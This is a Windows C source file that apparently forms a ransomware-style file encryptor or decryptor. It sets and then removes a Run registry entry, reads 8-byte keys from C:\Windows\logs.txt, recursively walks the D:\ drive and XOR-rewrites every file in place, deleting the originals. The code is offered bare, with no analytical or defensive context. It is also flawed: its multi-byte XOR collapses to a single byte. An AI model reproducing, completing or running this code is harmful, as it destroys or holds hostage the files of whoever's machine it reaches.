#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <time.h>
#include <conio.h>
#include <direct.h>
#define _WIN32_WINNT 0x0500 //set min OS environment

char encbuf[9] = {};

int padding(char fname[]);

char SearchDirectory(char *parm_search_path);

void enc(char *fname);

unsigned int getfilesize(char fname[]);



void de_enc(void);



int main(void)
{
	char path[MAX_PATH] = { 0, };
	HKEY hkey;
	long regOpenResult;
	GetModuleFileName(NULL, path, MAX_PATH);
	regOpenResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
	if (regOpenResult == ERROR_SUCCESS)
		RegSetValueEx(hkey, "fweade", 0, REG_SZ, (BYTE*)path, strlen(path));
	RegDeleteValue(hkey, "fweade");
	RegCloseKey(hkey);
	de_enc();

	return 0;
}




int padding(char fname[])
{
	FILE *fp;
	int i;
	long size = 0;
	fp = fopen(fname, "ab");
	if (!fp)
	{
		fprintf(stderr, "에러 발생.\n");
		return 1;
	}
	else
	{
		fseek(fp, 0L, SEEK_END);
		size = getfilesize(fname);
		printf("%d", size);
		while (size % 8 != 0)
		{
			size++;
			fputc('\0', fp);
		}
		fclose(fp);
	}
	return 0;
}

unsigned int getfilesize(char fname[])
{
	unsigned int size = 0;

	FILE *fp;

	fp = fopen(fname, "r");
	if (!fp)
		return 0;
	else
	{
		fseek(fp, 0L, SEEK_END);
		size = ftell(fp);
		fclose(fp);
		return size;
	}
}
/*
int check(char stack[1000][100])
{
int i;
for (i = 0; i < 1000; i++)
{
if (stack[i][0] != '\0')
return 0;
}
return 1;
}
*/
char SearchDirectory(char *parm_search_path)
{
	char * search_path = parm_search_path;
	char temp[1024] = { 0, };
	char fname[2048] = { 0, };
	WIN32_FIND_DATA file_data;
	strcat(temp, search_path);
	strcat(temp, "*.*");
	HANDLE search_handle = FindFirstFile(temp, &file_data);
	if (INVALID_HANDLE_VALUE != search_handle) {
		// if handle is right one
		do {
			if (FILE_ATTRIBUTE_DIRECTORY & file_data.dwFileAttributes) {
				// except current and up-root foldor
				if (strcmp(file_data.cFileName, ".") && strcmp(file_data.cFileName, "..")) {
					memset(temp, 0, sizeof(temp));
					strcat(temp, search_path);
					strcat(temp, file_data.cFileName);
					strcat(temp, "\\");
					//explore down-root folders
					printf("[DIR]: %s%s\n", search_path, file_data.cFileName);
					SearchDirectory(temp);
				}
			}
			else {
				memset(fname, 0, sizeof(fname));
				strcat(fname, search_path);
				strcat(fname, file_data.cFileName);
				if (padding(fname) == 1)
					continue;
				enc(fname);
				printf("[FILE]: %s\n", fname);
			}
			// copy next file's information to file_data from file list
			// if there's no next file, return 0
		} while (FindNextFile(search_handle, &file_data));

		// delte file list
		FindClose(search_handle);
	}

	return 1;
}
void enc(char *fname)
{
	FILE *ofp;
	FILE *ifp;
	int i;
	int j;
	int k;
	int size;
	char buf[9] = { 0, };
	char fdd[2049] = { 0, };
	strcat(fdd, fname);
	strcat(fdd, "1");
	ifp = fopen(fname, "rb");
	ofp = fopen(fdd, "wb");

	size = getfilesize(fname);
	for (i = 0; i < size / 8; i++)
	{
		fread(buf, 8, 1, ifp);
		for (j = 0; j < 8; j++)
		{
			for (k = 0; k < 8; k++)
			{
				buf[j] ^= encbuf[k];
			}
		}
		fwrite(buf, 8, 1, ofp);
	}
	fclose(ifp);
	fclose(ofp);
	remove(fname);
	rename(fdd, fname);


}

void de_enc(void)
{
	int i;
	int size;
	FILE *fp;
	int j;
	chdir("C:\\");
	chdir("Windows");
	fp = fopen("logs.txt", "rb");
	if (!fp)
		return;
	size = getfilesize("logs.txt");
	for (i = 0; i < size / 8; i++)
	{
		fread(encbuf, 8, 1, fp);
		SearchDirectory("D:\\");
	}
	fclose(fp);
	remove("logs.txt");
}
